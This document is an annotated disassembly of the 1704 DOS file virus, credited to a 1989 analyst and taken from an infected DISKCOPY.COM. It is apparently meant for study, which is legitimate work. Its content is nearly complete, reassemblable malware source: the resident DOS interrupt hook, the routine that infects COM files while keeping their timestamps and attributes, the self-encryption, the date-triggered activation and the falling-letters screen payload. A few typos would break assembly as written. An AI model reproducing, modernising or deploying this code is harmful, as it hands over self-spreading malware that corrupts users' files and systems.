;  1704 Virus - disassembly listing
;
;  Virus disassembled by Jim Bates - March 1989
;  from an example attached to DOS 3.3 DISKCOPY.COM file as a Host program.
;
;   Any hard coded offsets represent details concerning the Host program.
;
; Progress -
;   Pass 1 - Sort Code and Data areas - generate labels        - done
;   Pass 2 - Split subroutines - identify interrupts           - done
;   Pass 3 - Comment code and identify subroutines
;   Pass 4 - Reset Segment assumes and RAM/ROM access points
;   Pass 5 - Re-assemble as final test
;
;   Decryption key is length of host program.
;

; ----  Macros ----

RET_FAR  MACRO
DB 0CBH
ENDM

RET_NEAR MACRO
DB 0C3H
ENDM

; ---- End of Macros ----

; ---- Equates ----

LF EQU   0AH
CR EQU   0DH

; ---- End of Equates ----


;INITIAL VALUES : CS:IP 0000:0100
                  SS:SP 0000:FFFF
CODE SEGMENT
   ASSUME DS:CODE, SS:CODE ,CS:CODE ,ES:CODE
 
   ORG   100H

; All of this code appears AFTER decryption ...

CodeStart:
   MOV   SP,BP
   JMP   Start

; ---- Data Area ----
L181E          DB 90H            
HomeOff        DB 0,1             ; Jump to Host (Offset)
HomeCS         DB 33H,0FH         ;              (Segment)
InParm         DW 0,0
HostJmp        DB 0E9H,0FAH,04H   ; Original 3 bytes from top of host prog
L1828          DB 0,0

Old_INT1C_Off  DB 53H,0FFH        ; Old INT1CH Offset
Old_INT1C_Seg  DB 00H,0F0H        ; and Segement
Old_INT21_Off  DB 60H,14H         ; Old INT21 Offset
Old_INT21_Seg  DB 6AH,02H         ; and Segment
Old_INT28_Off  DB 45H,14H         ; Old INT28 Offset
Old_INT28_Seg  DB 70H,02H         ; and Segment
  
   DW 00H,00H
File_Atts      DW 00H,00H         ; Target file attributes
FileDate       DB 71H,0EH         : Date and ...
FileTime       DB 1FH,60H         ; Time setting of target file
FName_Off      DB 0B9H,41H        ; Pointer to ASCIIZ target filename
FName_Seg      DB 0EAH,9AH        ; to be loaded and possibly infected

                                  ; Bad date return is after Host has been
                                  ; relocated in higher segment
Hi_InParm      DB 0F7H,16H        ; New AX contents for bad date return
                                  ; Hi_InParm is also used to contain the
                                  ; LSW of the target file length
MSW_FileLen    DB 00H,00H         ; MSW of file length
Hi_HostJmp     DB 0E9H,64H,1DH    ; New return address for bad date

ScreenCols     DB 0
ScreenRows     DB 0
154H           DB 0
               DB 0
               DB 0

BitMap01       DB 8               ; Bit 3 Toggled after hooking INT28H
  
VideoRamSeg    DW 0,0

Vid_RegenOff  DB 0                ; Offset of Video Regen buffer
   DB 0

Comp           DB 0F8H            ; Clock speed compensation?
   DB 4
RanGen01       DB 0DAH,0FH        ; Random number storage 01
RanGen02       DB 0DAH,0FH        ; Random number storage 02
   DB 0,0
RanFlag        DW 01              ; Random Number Flag?
SysTime        DW 12H,0ECH
               DW 00H,0FH         ; This is the random number generator
               DW 00H,00H         ; ringshift counter
               DW 00H,00H
               DW 00H,01H
               DW 00H,00H
               DW 14H,14H
CountRing      DW 14H,00H

; ---- End of Data Area ----


Start:
   CALL  Label_1870
Label_1870:
   POP   BX
   SUB   BX,1A3H                   ; = 419 decimal
   MOV   CS:[BX+DS:154H],CS        ; = 1821H = HomeCS storage
   MOV   CS:[BX+DS:156H],AX        ; = 1823H = Calling value
   MOV   AX,CS:[BX+DS:158H]        ; = 1825H = Original bytes 1&2 of host
   MOV   DS:100H,AX
   MOV   AL,CS:[BX+DS:15AH]        ; = 1827H = Original byte 3 of host
   MOV   DS:102H,AL
   PUSH  BX
   MOV   AH,30H                    ; Get DOS version
   INT   21H
   POP   BX                        ; restore BX
   CMP   AL,2
   JB    QuitToHost                ; DOS 1 - no go
   MOV   AX,4BFFH                  ; Virus "Are you there?" call
   XOR   DI,DI                     ;  subfunction FF of function 4B - INT 21H
   XOR   SI,SI
   INT   21H
   CMP   DI,55AAH                  ; is it there?
   JNZ   GetOldINT21               ; Jump if not
QuitToHost:                        ; otherwise - Quit
   STI                             ; Back to the Host program ...
   PUSH  DS
   POP   ES
   MOV   AX,CS:[BX+DS:156H]        ; = L1823 = Restore Input Parameter
   JMP   DWORD PTR CS:[BX+DS:152H] ; = L181F = Jump to Host Program

GetOldINT21:                     
   PUSH  BX
   MOV   AX,3521H                  ; Collect INT 21H vector
   INT   21H
   MOV   AX,BX                     ; Save Offset (Seg in ES)
   POP   BX

;     This section of code checks the copyright notice in the ROM
;     at address 0F000:0E008H - for the  <>  message
;     if the message is found, the virus code aborts.

   MOV   CS:[BX+DS:161H],AX        ; = L182E = OldINT21 Offset
   MOV   CS:[BX+DS:163H],ES        ; = L1830 = OldINT21 Segment
   MOV   AX,0F000H                 ; Point to ROM
   MOV   ES,AX
   MOV   DI,0E008H                 ; Offset of copyright message
   CMP   WORD PTR ES:[DI],4F43H    ;'OC'   Message checked =
   JNZ   NotIBM                    ;           COPR. IBM
   CMP   WORD PTR ES:[DI+2],5250H  ;'RP'
   JNZ   NotIBM                 
   CMP   WORD PTR ES:[DI+4],202EH  ;' .'
   JNZ   NotIBM
   CMP   WORD PTR ES:[DI+6],4249H  ;'BI'
   JNZ   NotIBM
   CMP   WORD PTR ES:[DI+8],4DH    ;'M'
   JZ    QuitToHost
NotIBM:
   MOV   AX,7BH                    ; Paragraphs of RAM required
   MOV   BP,CS                         
   DEC   BP
   MOV   ES,BP                     ; ES now points to 10H bytes before
   MOV   SI,CS:16H                 ;   the PSP =  MCB
   MOV   ES:1,SI                   ; MCB + 1
   MOV   DX,ES:3                   : MCB + 3
   MOV   ES:3,AX
   MOV   BYTE PTR ES:0,4DH         ; MCB start
   SUB   DX,AX
   DEC   DX
   INC   BP                        ; BP now equals CS again
   ADD   BP,AX                     ; + 7BH paragraphs (= 7B0H - 1968d bytes)
   INC   BP                        ; + 1 paragraph (= 7C0H - 1984d bytes)
   MOV   ES,BP                     ; Point ES to new segment
   PUSH  BX                        ; Save position indicator
   MOV   AH,50H                    ; Set active PSP location from BX
   MOV   BX,BP
   INT   21H
   POP   BX                        ; restore position indicator
   XOR   DI,DI                     ; clear Destination Index
   PUSH  ES                        ; put new segment ...
   POP   SS                        ; as stacktop
   PUSH  DI                        ; Save destination index
   LEA   DI,[BX+DS:7D1H]           ; = 1E9EH = Prog end
   MOV   SI,DI                     ; into source index
   MOV   CX,6A8H                   ; = 1704H = Prog Length
   STD                             ; Set direction flag to decrement
   REPZ  MOVSB                     ; DS:SI -> ES:DI  Move Virus up
   PUSH  ES                        ; to beyond existing offset in new segment
   LEA   CX,[BX+DS:273H]           ; = Address of Hi_Label01
   PUSH  CX
   RET_FAR                         ; Jumps to next instruction,
                                   ; in new segment, clearing stack

; The following is executed by the high memory copy of the code

Hi_Label01:                       ; Now at new location
   MOV   CS:[BX+DS:154H],CS       ; = 1821H = HomeCS storage
   LEA   CX,[BX+DS:12AH]          ; = 17F7H = Length+1 of host program
   REPZ  MOVSB                    ; DS:SI -> ES:DI   Move Host up
   MOV   CS:36H,CS                ; Rebuild new PSP
   DEC   BP                       ;
   MOV   ES,BP                    ; Point ES to MCB before PSP
   MOV   ES:3,DX                  ; Rebuild MCB
   MOV   BYTE PTR ES:0,5AH        ; 'Z' into MCB start
   MOV   ES:1,CS                  ; CS into MCB + 1
   INC   BP
   MOV   ES,BP                    ; ES back to CS now
   PUSH  DS
   POP   ES                       ; ES points to previous segment
   PUSH  CS
   POP   DS                       ; DS points to current CS
   LEA   SI,[BX+DS:12AH]          ; = 17F7H = Length+1 of host program
   MOV   DI,100H                  ; Normal program start offset
   MOV   CX,6A8H                  ; = 1704 decimal
   CLD                            ; Clear direction flag to increment
   REPZ  MOVSB                    ; DS:SI -> ES:DI  -  moves virus down
   PUSH  ES                       ; Original Segment
   LEA   AX,DS:287H               ; Offset of Lo_Label01
   PUSH  AX
   RET_FAR                        ; Transfer control to original segment
                                  ; Lo_Virus

; The following is executed by the Lo memory (repositioned) copy of the code

Lo_Label01:
   MOV   WORD PTR CS:2CH,0        ; PSP - Set segment address of DOS Environment
   MOV   CS:16H,CS                ; PSP - Set home segment
   PUSH  DS
   LEA   DX,DS:31FH               ; New_INT21 vector address
   PUSH  CS
   POP   DS                       ; This segment
   MOV   AX,2521H                 ; Reset INT21H vector to DS:DX
   INT   21H
   POP   DS
   MOV   AH,1AH                   ; Set DTA to DS:DX
   MOV   DX,80H                   ; this is within the PSP
   INT   21H
   CALL  CollectSysTime           ; Collect System timer into SysTime
   MOV   AH,2AH                   ; Collect System Date
   INT   21H

;  This section of code checks the current system date setting ...
;  If the year is 1980 (ie: no calender card or battery backup)
;    then both INT 28H and INT1CH are revectored
;  If the year is 1988 and the month is Oct, Nov or Dec
;    then only INT 1CH is revectored

   CMP   CX,1988                  ; CX = Year
   JA    QuitToHi_Host            ; Jump if > 1988
   JZ    Lo_Label02               ; Jump if = 1988
   CMP   CX,1980
   JNZ   QuitToHi_Host            ; Jump if not 1980
   PUSH  DS                       ; Save data segment
   MOV   AX,3528H                 ; Collect INT28H vector
   INT   21H                      ; Random Block Write
   MOV   CS:13BH,BX               ; Save Offset
   MOV   CS:13DH,ES               ; Save Segment
   MOV   AX,2528H                 ; Reset INT28H vector
   MOV   DX,725H                  ; offset of original code
   PUSH  CS
   POP   DS                       ; Set DS to this segment
   INT   21H
   POP   DS                       ; Restore Data segment
   OR    BYTE PTR CS:157H,8       ; Toggle Bitmap01
   JMP   Lo_Label03              
   NOP
Lo_Label02:  
   CMP   DH,0AH                   ; Check month
   JB    QuitToHi_Host            ; Jump if earlier than October
Lo_Label03:  
   CALL  CheckClock               ; Set clock compensation
   MOV   AX,1518H
   CALL  RanGen                   ; Generate Random number
   INC   AX
   MOV   CS:15EH,AX               ; Save it in RanGen01
   MOV   CS:160H,AX               ; and in RanGen02
   MOV   WORD PTR CS:164H,1       ; Set RanFlag?
   MOV   AX,351CH                 ; Collect INT1CH vector
   INT   21H
   MOV   CS:133H,BX               ; Store Offset
   MOV   CS:135H,ES               ;   and Segment
   PUSH  DS
   MOV   AX,251CH                 ; Revector INT 1CH
   MOV   DX,6C0H                  ; to New_INT1C
   PUSH  CS
   POP   DS
   INT   21H
   POP   DS
QuitToHi_Host:
   MOV   BX,0FFD6H                ; New BX offset correction for Hi_Mem Host
   JMP   QuitToHost

; This section of code hooks in to the DOS function call 4BH
;  adding a new sub-function of 0FFH which returns

New_INT21:
   CMP   AH,4BH                   ; Is it the one that we want?
   JZ    NI21_03                  ; Yes - so jump
NI21_01:
   JMP   DWORD PTR CS:137H        ; No so carry on with Old_INT21_Off

NI21_02:
   MOV   DI,55AAH                 ; Yes I'm here! signature from resident virus
   LES   AX,DWORD PTR CS:137H     ; Set ES and AX to Old_INT21 address
   MOV   DX,CS                    ; put this segment into DX
   IRET                           ; and return to INT caller

NI21_03:
   CMP   AL,0FFH                  ; Is he asking about the Virus?
   JZ    NI21_02                  ; Yes - so tell him we're here
   CMP   AL,0                     ; 0 = Load and Execute
   JNZ   NI21_01                  ; Only loading so quit
   PUSHF                          ; Prepare the stack and save the registers
   PUSH  AX
   PUSH  BX
   PUSH  CX
   PUSH  DX
   PUSH  SI
   PUSH  DI
   PUSH  BP
   PUSH  ES
   PUSH  DS
   MOV   CS:147H,DX               ; Offset of filename (ASCIIZ)
   MOV   CS:149H,DS               ; Segment
   PUSH  CS                      
   POP   ES                       ; Set ES to this segment
   MOV   AX,3D00H
   INT   21H                      ; Open file for Read Only acces
   JC    Quit_Open                ; Jump if error
   MOV   BX,AX                    ; Put handle into BX
   MOV   AX,5700H                 ; Get file's Date and Time stamp
   INT   21H
   MOV   CS:143H,DX               ; store Date  (FileDate)
   MOV   CS:145H,CX               ; store Time  (FileTime)
   MOV   AH,3FH                   ; Read from a file - function call
   PUSH  CS
   POP   DS
   MOV   DX,12EH                  ; Into HostJmp buffer
   MOV   CX,3                     ; just get 3 bytes
   INT   21H
   JC    Quit_Open                ; Quit on error
   CMP   AX,CX                    ; did we read three bytes?
   JNZ   Quit_Open                ; No - so quit
   MOV   AX,4202H                 ; Move file pointer to 0 bytes from file end
   XOR   CX,CX
   XOR   DX,DX
   INT   21H
   MOV   CS:14BH,AX               ; File length LSW
   MOV   CS:14DH,DX               ; File length MSW
   MOV   AH,3EH                   ; Close file
   INT   21H
   CMP   WORD PTR CS:12EH,'ZM'    ; Did we read an EXE header?
   JNZ   NI21_04                  ; No - so jump
   JMP   Quit_Read

NI21_04:  
   CMP   WORD PTR CS:14DH,0       ; Is file > 64K ?
   JA    Quit_Open                ;  Yes  - so quit
   CMP   WORD PTR CS:14BH,0F938H  ; is file length above 63800 bytes
   JBE   L1AA9                    ; No so continue
Quit_Open:
   JMP   Quit_Read

L1AA9:  
   CMP   BYTE PTR CS:12EH,0E9H    ; is first byte in target a jump?
   JNZ   L1ABF                    ; No - so jump
   MOV   AX,CS:14BH               ; Collect LSW of file length
   ADD   AX,0F956H                ; Add the offset correction
   CMP   AX,CS:12FH               ; is the file already infected?
   JZ    Quit_Open                ; yes - so quit
L1ABF:  
   MOV   AX,4300H                 ; Get file attributes
   LDS   DX,DWORD PTR CS:147H     ; Point to target filename
   INT   21H
   JC    Quit_Open                ; Quit if error
   MOV   CS:141H,CX               ; Save attribute bits
   XOR   CL,20H                   ; Is it an ordinary file?
   TEST  CL,27H                   ; Check the bits
   JZ    RW_Open                  ; Yes - so jump
   MOV   AX,4301H                 ; otherwise - reset the attributes
   XOR   CX,CX                    ; to normal
   INT   21H
   JC    Quit_Open                ; Quit on error
RW_Open:
   MOV   AX,3D02H                 ; Open target for RW access
   INT   21H
   JC    Quit_Open                ; Quit if error
   MOV   BX,AX                    ; get handle
   MOV   AX,4202H                 ; Move file pointer to file end
   XOR   CX,CX
   XOR   DX,DX
   INT   21H
   CALL  InfectFile               ; Infect target file
   JNB   InfectedOK               ; Infection successful - so jump
   MOV   AX,4200H
   MOV   CX,CS:14DH               ; Set file pointer to
   MOV   DX,CS:14BH               ; end of Target file
   INT   21H
   MOV   AH,40H                   ; Write 0 bytes to file
   XOR   CX,CX                    ; sets error flag?
   INT   21H
   JMP   RW_Open_Quit

InfectedOK:
   MOV   AX,4200H                 ; Set file pointer to beginning
   XOR   CX,CX
   XOR   DX,DX
   INT   21H
   JC    RW_Open_Quit             ; Quit if error
   MOV   AX,CS:14BH               ; Get original target length
   ADD   AX,0FFFEH                ; correct it for initial jump
   MOV   CS:150H,AX               ; Save it in HostJmp
   MOV   AH,40H                   ; gonna write it
   MOV   DX,14FH                  ; from this offset
   MOV   CX,3                     ; just 3 bytes
   INT   21H
RW_Open_Quit:
   MOV   AX,5701H                 ; Now put target's Date and Time
   MOV   DX,CS:143H               ; back as they were
   MOV   CX,CS:145H      
   INT   21H
   MOV   AH,3EH                   ; Close the file
   INT   21H
   MOV   CX,CS:141H               ; Collect targets original attributes
   TEST  CL,7                     ; do they need resetting?
   JNZ   Reset_Atts               ; Yes - so jump
   TEST  CL,20H                   ; Needs Archive bit set? 
   JNZ   Quit_Read                ; No - so jump
Reset_Atts:
   MOV   AX,4301H                 ; prepare to reset attributes
   LDS   DX,DWORD PTR CS:147H     ; Pointer to ASCIIZ file name of target
   INT   21H                      ; do it - and ...
Quit_Read:
   POP   DS                       ; restore registers before quitting
   POP   ES
   POP   BP
   POP   DI
   POP   SI
   POP   DX
   POP   CX
   POP   BX
   POP   AX
   POPF
   JMP   NI21_01

RanGen:                           ; Random number generator
   PUSH  DS
   PUSH  CS
   POP   DS
   PUSH  BX
   PUSH  CX
   PUSH  DX
   PUSH  AX
   MOV   CX,7
   MOV   BX,174H                  ; CountRing
   PUSH  [BX]
RanGenLoop:                       ; Loop around 7 words
   MOV   AX,[BX-2]
   ADC   [BX],AX
   DEC   BX
   DEC   BX
   LOOP  RanGenLoop
   POP   AX
   ADC   [BX],AX
   MOV   DX,[BX]
   POP   AX
   OR    AX,AX
   JZ    RanGenDone
   MUL   DX
RanGenDone:
   MOV   AX,DX
   POP   DX
   POP   CX
   POP   BX
   POP   DS
   RET_NEAR

CollectSysTime:  
   PUSH  DS
   PUSH  ES
   PUSH  SI
   PUSH  DI
   PUSH  CX
   PUSH  CS
   POP   ES
   MOV   CX,40H                   ; Set segment to 0040
   MOV   DS,CX
   MOV   DI,166H                  ; Destination is SysTime
   MOV   SI,6CH                   ; from 0040:006CH
   MOV   CX,8                     ; Get 8 bytes and seed Random Number gen'r.
   CLD
   REPZ  MOVSW
   POP   CX
   POP   DI
   POP   SI
   POP   ES
   POP   DS
   RET_NEAR

L1BB2:  
   PUSH  SI
   PUSH  DS
   PUSH  DX
   MOV   AL,DH
   MUL   BYTE PTR DS:152H         ;'R'
   MOV   DH,0
   ADD   AX,DX
   SHL   AX,1
   ADD   AX,DS:15AH               ;'Z'
   MOV   SI,AX
   TEST  BYTE PTR DS:154H,0FFH    ;'T'
   MOV   DS,DS:158H               ;Get Video RAM Segment
   JZ    L1BE4
   MOV   DX,3DAH
   CLI
L1BD6:  
   IN    AL,DX
   TEST  AL,8
   JNZ   L1BE4
   TEST  AL,1
   JNZ   L1BD6
L1BDF:  
   IN    AL,DX
   TEST  AL,1
   JZ    L1BDF
L1BE4:  
   LODSW
   STI
   POP   DX
   POP   DS
   POP   SI
   RET_NEAR

L1BEA:  
   PUSH  DI
   PUSH  ES
   PUSH  DX
   PUSH  BX
   MOV   BX,AX
   MOV   AL,DH
   MUL   BYTE PTR DS:152H  ;'R'
   MOV   DH,0
   ADD   AX,DX
   SHL   AX,1
   ADD   AX,DS:15AH  ;'Z'
   MOV   DI,AX
   TEST  BYTE PTR DS:154H,0FFH   ;'T'
   MOV   ES,DS:158H  ;'X'
   JZ    L1C1F
   MOV   DX,3DAH
   CLI
L1C11:  
   IN    AL,DX
   TEST  AL,8
   JNZ   L1C1F
   TEST  AL,1
   JNZ   L1C11
L1C1A:  
   IN    AL,DX
   TEST  AL,1
   JZ    L1C1A
L1C1F:  
   MOV   AX,BX
   STOSB
   STI
   POP   BX
   POP   DX
   POP   ES
   POP   DI
   RET_NEAR

L1C28:  
   PUSH  CX
L1C29:  
   PUSH  CX
   MOV   CX,DS:15CH  ;'\'
L1C2E:  
   LOOP  L1C2E
   POP   CX
   LOOP  L1C29
   POP   CX
   RET_NEAR

L1C35:  
   PUSH  AX
   IN    AL,61H
   XOR   AL,2
   AND   AL,0FEH
   OUT   61H,AL
   POP   AX
   RET_NEAR

L1C40:  
   CMP   AL,0
   JZ    L1C4E
   CMP   AL,20H   ;' '
   JZ    L1C4E
   CMP   AL,0FFH
   JZ    L1C4E
   CLC
   RET_NEAR

L1C4E:  
   STC
   RET_NEAR

L1C50:  
   CMP   AL,0B0H
   JB    L1C5A
   CMP   AL,0DFH
   JA    L1C5A
   STC
   RET_NEAR

L1C5A:  
   CLC
   RET_NEAR

CheckClock:
   PUSH  DS
   MOV   AX,40H                   ; Set Data segment
   MOV   DS,AX
   STI                            ; Enable interrupts
   MOV   AX,DS:6CH                ; Get timer value
CCLoop01:
   CMP   AX,DS:6CH                ; Wait until it changes
   JZ    CCLoop01
   XOR   CX,CX                    ; Clear CX
   MOV   AX,DS:6CH                ; Read Clock again
CCLoop02:
   INC   CX                       ; Count up to 65536
   JZ    CC02                 
   CMP   AX,DS:6CH                ; Check timer again 
   JZ    CCLoop02                 ; Wait until it changes
CC01:
   POP   DS
   MOV   AX,CX
   XOR   DX,DX
   MOV   CX,0FH
   DIV   CX
   MOV   CS:15CH,AX               ; Compensation value?  Comp
   RET_NEAR
CC02:
   DEC   CX
   JMP   SHORT CC01

LetterFall:
   MOV   BYTE PTR DS:153H,18H     ; ScreenRows
   PUSH  DS
   MOV   AX,40H                   ; Looking at Data Segment
   MOV   DS,AX
   MOV   AX,DS:4EH                ; Get start of Video Regen Buffer into AX
   POP   DS
   MOV   DS:15AH,AX               ; Store it into Vid_RegenOff
   MOV   DL,0FFH
   MOV   AX,1130H                 ; Get Font information
   MOV   BH,0
   PUSH  ES
   PUSH  BP
   INT   10H                     
   POP   BP
   POP   ES
   CMP   DL,0FFH                  ; Is it EGA?
   JZ    LF01                     ; No - so jump leaving default 18H rows
   MOV   DS:153H,DL               ; Save number of rows
LF01:
   MOV   AH,0FH                   ; Get current Video Mode
   INT   10H
   MOV   DS:152H,AH               ; Save number of screen columns
   MOV   BYTE PTR DS:154H,0       ;
   MOV   WORD PTR DS:158H,0B000H  ; Video RAM Segment
   CMP   AL,7                     ; Mode 7 (EGA Mono 80x25 text)
   JZ    L1D01                    ; Yes - so jump
   JC    TextModes                ; Less than mode 7
   JMP   NoFall                   ; Greater than mode 7  (ie: graphics)

TextModes:
   MOV   WORD PTR DS:158H,0B800H  ; Video RAM Segment
   CMP   AL,3                     ; Mode 3 (Colour - 80x25 text)
   JA    L1D01
   CMP   AL,2                     ; Mode 2 (Greyscale - 80x25 text)
   JB    L1D01
   MOV   BYTE PTR DS:154H,1       ;
   MOV   AL,DS:153H               ; Get number of Rows
   INC   AL                       ; +1
   MUL   BYTE PTR DS:152H         ; Screen Columns
   MOV   DS:162H,AX               ; Save in
   MOV   AX,DS:164H               ;
   CMP   AX,DS:162H               ;
   JBE   L1CFB
   MOV   AX,DS:162H               ;
L1CFB:  
   CALL  RanGen
   INC   AX
   MOV   SI,AX
L1D01:  
   XOR   DI,DI
L1D03:  
   INC   DI
   MOV   AX,DS:162H               ;
   SHL   AX,1
   CMP   DI,AX
   JBE   L1D10
   JMP   NoFall

L1D10:  
   OR    BYTE PTR DS:157H,2       ;
   MOV   AL,DS:152H               ;
   MOV   AH,0
   CALL  RanGen
   MOV   DL,AL
   MOV   AL,DS:153H  ;'S'
   MOV   AH,0
   CALL  RanGen
   MOV   DH,AL
   CALL  L1BB2
   CALL  L1C40
   JB    L1D03
   CALL  L1C50
   JB    L1D03
   MOV   DS:155H,AL  ;'U'
   MOV   DS:156H,AH  ;'V'
   MOV   CL,DS:153H  ;'S'
   MOV   CH,0
L1D43:  
   INC   DH
   CMP   DH,DS:153H  ;'S'
   JA    L1D9D
   CALL  L1BB2
   CMP   AH,DS:156H  ;'V'
   JNZ   L1D9D
   CALL  L1C40
   JB    L1D81
L1D59:  
   CALL  L1C50
   JB    L1D9D
   INC   DH
   CMP   DH,DS:153H  ;'S'
   JA    L1D9D
   CALL  L1BB2
   CMP   AH,DS:156H  ;'V'
   JNZ   L1D9D
   CALL  L1C40
   JNB   L1D59
   CALL  L1C35
   DEC   DH
   CALL  L1BB2
   MOV   DS:155H,AL  ;'U'
   INC   DH
L1D81:  
   AND   BYTE PTR DS:157H,0FDH   ;'W'
   DEC   DH
   MOV   AL,20H   ;' '
   CALL  L1BEA
   INC   DH
   MOV   AL,DS:155H  ;'U'
   CALL  L1BEA
   JCXZ  L1D9B
   CALL  L1C28
   DEC   CX
L1D9B:  
   JMP   SHORT L1D43

L1D9D:  
   TEST  BYTE PTR DS:157H,2   ;'W'
   JZ    L1DA7
   JMP   L1D03

L1DA7:  
   CALL  L1C35
   DEC   SI
   JZ    NoFall
   JMP   L1D01

NoFall:
   IN    AL,61H
   AND   AL,0FCH
   OUT   61H,AL
   RET_NEAR

New_INT1C:                        ; 6C0H
   TEST  BYTE PTR CS:157H,9       ; Check BitMap01
   JNZ   Quit_INT1CH
   OR    BYTE PTR CS:157H,1       ; Set BitMap01
   DEC   WORD PTR CS:15EH         ; Decrement the Random number
   JNZ   INT1CH_Out               ; Quit if not zero
   PUSH  DS                       ; Now prepare for display interference
   PUSH  ES
   PUSH  CS
   POP   DS
   PUSH  CS
   POP   ES
   PUSH  AX
   PUSH  BX
   PUSH  CX
   PUSH  DX
   PUSH  SI
   PUSH  DI
   PUSH  BP
   MOV   AL,20H                   ; Interrupt controller port
   OUT   20H,AL                   ;
   MOV   AX,DS:160H               ;
   CMP   AX,438H                  ; Random Number check
   JNB   INT1C_01
   MOV   AX,438H                 
INT1C_01:
   CALL  RanGen
   INC   AX
   MOV   DS:15EH,AX               ; Reset Random number
   MOV   DS:160H,AX               ;
   CALL  LetterFall
   MOV   AX,3
   CALL  RanGen
   INC   AX
   MUL   WORD PTR DS:164H  ;'d'
   JNB   L1E05
   MOV   AX,0FFFF
L1E05:  
   MOV   DS:164H,AX  ;'d'
   POP   BP
   POP   DI
   POP   SI
   POP   DX
   POP   CX
   POP   BX
   POP   AX
   POP   ES
   POP   DS
INT1CH_Out:
   AND   BYTE PTR CS:157H,0FEH    ; Gate out the 0 bit of BitMap01
Quit_INT1CH:
   JMP   DWORD PTR CS:133H        ; Continue with INT 1CH

New_INT28:                        ; 725H
   TEST  BYTE PTR CS:157H,8       ; Chek BitMap01
   JZ    Virus_Hot
   PUSH  AX
   PUSH  CX
   PUSH  DX
   MOV   AH,2AH                   ; Get System Date
   INT   21H
   CMP   CX,7C4H                  ; Is it 1988?
   JC    Virus_Inhibit            ; No - it's earlier
   JA    Virus_Enable             ; No - it's later
   CMP   DH,0AH                   ; Is it October?
   JC    Virus_Inhibit            ; No, it's earlier
Virus_Enable:
   AND   BYTE PTR CS:157H,0F7H    ; Gate out the Virus inhibit bit
Virus_Inhibit:
   POP   DX
   POP   CX
   POP   AX
Virus_Hot:
   JMP   DWORD PTR CS:13BH        ; Continue with INT 28H

InfectFile:                       ; Allocate memory for virus code
   PUSH  ES                       ; to be written to target file
   PUSH  BX
   MOV   AH,48H                 
   MOV   BX,6BH                   ; 6BH paragraphs required
   INT   21H
   POP   BX
   JNB   Get_Virus
Alloc_Quit:
   STC                            ; Set the error condition
   POP   ES                       ; Restore ES
   RET_NEAR                       ; and return

Get_Virus:
   MOV   BYTE PTR CS:100H,1       ; Set encryption flag
   MOV   ES,AX                    ; Set newly allocate segment
   PUSH  CS
   POP   DS                       ; DS points to this segment
   XOR   DI,DI                    ; Destination
   MOV   SI,100H                  ; Source
   MOV   CX,6A8H                  ; Set byte count to 1704d
   CLD                            ; Set direction flag to increment
   REPZ  MOVSB                    ; Copy Virus to new Segment
   MOV   DI,23H                   ; Set to start of encrypted section
   MOV   SI,123H                  ; in both segments
   ADD   SI,DS:14BH               ; add the file length (key)
   MOV   CX,685H                  ; encrypting 1669d bytes
Encrypt:
   XOR   ES:[DI],SI               ; Encryption is a reverse of the earlier
   XOR   ES:[DI],CX               ; decryption...
   INC   DI
   INC   SI
   LOOP  Encrypt                  ; loop until completed
   MOV   DS,AX                    ; Set DS to encrypted copy segment
   MOV   AH,40H                   ; Going to append it to the file
   XOR   DX,DX                    ; from offset 0 in DS:
   MOV   CX,6A8H                  ; writing 1704d bytes
   INT   21H                      ; Write them
   PUSHF                          ; Save flags
   PUSH  AX                       ; and AX
   MOV   AH,49H                   ; Free allocated memory
   INT   21H
   POP   AX                       ; restore AX
   POPF                           ; and Flags
   PUSH  CS                       ; restore
   POP   DS                       ; DS
   JC    Alloc_Quit               ; Quit if Write failed
   CMP   AX,CX                    ; Did we write ALL the code?
   JNZ   Alloc_Quit               ; No - so quit
   POP   ES                       ; otherwise
   CLC                            ; Clear the error indicator
   RET_NEAR                       ; Return to caller

   CODE ENDS
;
END
